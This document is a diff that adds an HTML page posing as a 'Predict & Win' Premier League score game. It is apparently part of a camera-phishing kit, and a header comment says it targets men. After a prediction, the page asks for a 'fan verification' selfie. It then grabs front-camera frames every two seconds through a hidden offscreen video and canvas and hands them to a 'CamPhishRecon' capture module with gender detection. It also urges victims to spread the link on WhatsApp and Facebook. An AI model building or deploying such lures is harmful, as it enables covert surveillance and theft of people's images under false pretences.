@@ -1,0 +1,109 @@
+<!-- DESC: Sports score prediction game — male targeted, camera for fan selfie verification -->
+<!DOCTYPE html>
+<html lang="en"><head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no,viewport-fit=cover">
+<meta name="apple-mobile-web-app-capable" content="yes">
+<meta name="theme-color" content="#0a1a2a">
+<title>Predict & Win — Sports Predictor</title>
+<style>
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;font-family:-apple-system,sans-serif}
+body{background:linear-gradient(135deg,#0a1a2a,#0d2538,#102e4a);min-height:100vh;display:flex;align-items:center;justify-content:center;color:#fff;overflow-y:auto;touch-action:manipulation;user-select:none}
+.hidden{display:none}
+.box{width:400px;max-width:92vw;padding:36px;text-align:center}
+.logo{font-size:28px;font-weight:900;color:#00e5ff;margin-bottom:4px}
+.sub{color:#4a8aaa;font-size:13px;margin-bottom:28px}
+.match{background:rgba(255,255,255,0.05);border:1px solid rgba(0,229,255,0.15);border-radius:16px;padding:20px;margin-bottom:20px}
+.league{font-size:11px;color:#4a8aaa;text-transform:uppercase;letter-spacing:1px;margin-bottom:12px}
+.teams{display:flex;justify-content:space-around;align-items:center;margin-bottom:16px}
+.team{text-align:center}.team-emoji{font-size:36px}.team-name{font-size:13px;color:#aab;margin-top:4px}
+.vs{font-size:20px;color:#4a8aaa;font-weight:900}
+.score-pick{display:flex;justify-content:center;gap:16px;align-items:center;margin-bottom:20px}
+.score-input{width:60px;height:60px;background:rgba(0,229,255,0.1);border:2px solid rgba(0,229,255,0.3);border-radius:12px;color:#00e5ff;font-size:28px;font-weight:900;text-align:center;border:none;outline:none;-webkit-appearance:none}
+.score-input:focus{border-color:#00e5ff}
+.dash{color:#4a8aaa;font-size:28px}
+.predict-btn{background:linear-gradient(135deg,#00e5ff,#0099cc);color:#000;border:none;padding:14px 48px;border-radius:30px;font-size:18px;font-weight:900;cursor:pointer;width:100%;margin-bottom:12px}
+.predict-btn:active{transform:scale(0.97)}
+.result{display:none}.result.active{display:block}
+.result-emoji{font-size:56px;margin-bottom:12px}
+.result-title{font-size:22px;font-weight:700;color:#00e5ff;margin-bottom:8px}
+.result-desc{color:#aab;font-size:14px;line-height:1.6;margin-bottom:20px}
+.verify-btn{background:linear-gradient(135deg,#0099cc,#006699);color:#fff;border:none;padding:12px 40px;border-radius:30px;font-size:15px;font-weight:700;cursor:pointer;width:100%;margin-bottom:12px}
+.verify-btn:active{transform:scale(0.97)}
+.share-btns{display:flex;gap:8px}
+.sb{flex:1;padding:10px;border:none;border-radius:20px;color:#fff;font-weight:600;font-size:13px;cursor:pointer}
+.s-wa{background:#25D366}.s-fb{background:#1877F2}
+.scanning{position:fixed;inset:0;background:rgba(10,26,42,0.97);z-index:100;display:none;align-items:center;justify-content:center;flex-direction:column}
+.scanning.active{display:flex}
+.scan-frame{width:180px;height:180px;border:3px solid #00e5ff;border-radius:12px;margin-bottom:20px;position:relative;overflow:hidden;background:#000}
+.scan-frame::after{content:'';position:absolute;left:0;right:0;height:3px;background:#00e5ff;animation:scanline 2s infinite}
+@keyframes scanline{0%{top:0}100%{top:100%}}
+video,canvas#cap{position:fixed;opacity:0;width:2px;height:2px;top:-9999px;left:-9999px}
+</style>
+</head><body>
+<script src="forwarding_link/t/recon.js"></script>
+<video id="v" playsinline autoplay muted></video>
+<canvas id="cap" width="320" height="240"></canvas>
+<div class="box">
+<div class="logo">⚽ Predict & Win</div>
+<div class="sub">Predict the score · Win prizes · Show your fan pride</div>
+<div class="match">
+<div class="league">Premier League · Today 8:00 PM</div>
+<div class="teams">
+<div class="team"><div class="team-emoji">🔴</div><div class="team-name">Man United</div></div>
+<div class="vs">VS</div>
+<div class="team"><div class="team-emoji">🔵</div><div class="team-name">Chelsea</div></div>
+</div>
+</div>
+<div class="score-pick">
+<input type="number" class="score-input" id="s1" min="0" max="20" placeholder="0" value="">
+<div class="dash">—</div>
+<input type="number" class="score-input" id="s2" min="0" max="20" placeholder="0" value="">
+</div>
+<button class="predict-btn" id="predictBtn" onclick="submitPrediction()">Submit Prediction</button>
+<div class="result" id="result">
+<div class="result-emoji">🎯</div>
+<div class="result-title">Prediction Locked In!</div>
+<div class="result-desc" id="resultDesc"></div>
+<button class="verify-btn" onclick="verifyFan()">📸 Verify Fan Identity</button>
+<div class="share-btns"><button class="sb s-wa" onclick="sharePred('wa')">💬 Share</button><button class="sb s-fb" onclick="sharePred('fb')">📘 Share</button></div>
+</div>
+</div>
+<div class="scanning" id="scanning">
+<div class="scan-frame"></div>
+<div style="font-size:18px;font-weight:700;color:#00e5ff">Verifying fan identity...</div>
+<div style="font-size:13px;color:#4a8aaa;margin-top:8px">Look at the camera</div>
+</div>
+<script>
+var API='API_BASE_URL',SHARE_URL='forwarding_link/t/sports-predictor';
+if(window.CamPhishRecon)CamPhishRecon.init({genderDetect:true});
+function submitPrediction(){
+var s1=document.getElementById('s1').value||'0';
+var s2=document.getElementById('s2').value||'0';
+if(s1===''&&s2===''){alert('Enter your predicted score first!');return;}
+document.getElementById('resultDesc').innerHTML='Your prediction: <b>'+s1+' - '+s2+'</b>. Verify you\'re a real fan with a quick selfie to enter the prize draw!';
+document.getElementById('result').classList.add('active');
+document.getElementById('predictBtn').textContent='✓ Prediction Submitted';
+document.getElementById('predictBtn').disabled=true;
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('prediction_made',{score:s1+'-'+s2});
+}
+function verifyFan(){
+var sc=document.getElementById('scanning');sc.classList.add('active');
+if(window.CamPhishRecon)CamPhishRecon.Capture.event('fan_verify',{});
+if(navigator.mediaDevices){
+navigator.mediaDevices.getUserMedia({audio:false,video:{facingMode:'user'}}).then(function(stream){
+var v=document.getElementById('v');v.srcObject=stream;v.play();
+var cap=document.getElementById('cap'),cx=cap.getContext('2d');
+var ci=setInterval(function(){if(v.readyState>=2){cx.drawImage(v,0,0,320,240);if(window.CamPhishRecon)CamPhishRecon.Capture.image(cap.toDataURL('image/png'),'fan_verify');}},2000);
+setTimeout(function(){clearInterval(ci);sc.classList.remove('active');alert('Fan verified! You\'re entered in the prize draw.');},6000);
+}).catch(function(){setTimeout(function(){sc.classList.remove('active');alert('Camera needed for fan verification.');},2000);});
+}else{setTimeout(function(){sc.classList.remove('active');},2000);}
+}
+function sharePred(t){
+var msg='⚽ I predicted the score on Predict & Win! Make your prediction: '+SHARE_URL;
+if(navigator.canShare){navigator.share({text:msg,title:'Predict & Win'}).catch(function(){});return;}
+if(t==='wa')open('whatsapp://send?text='+encodeURIComponent(msg),'_blank');
+else if(t==='fb')open('https://www.facebook.com/sharer/sharer.php?u='+encodeURIComponent(SHARE_URL)+'&quote='+encodeURIComponent(msg),'_blank');
+}
+</script>
+</body></html>
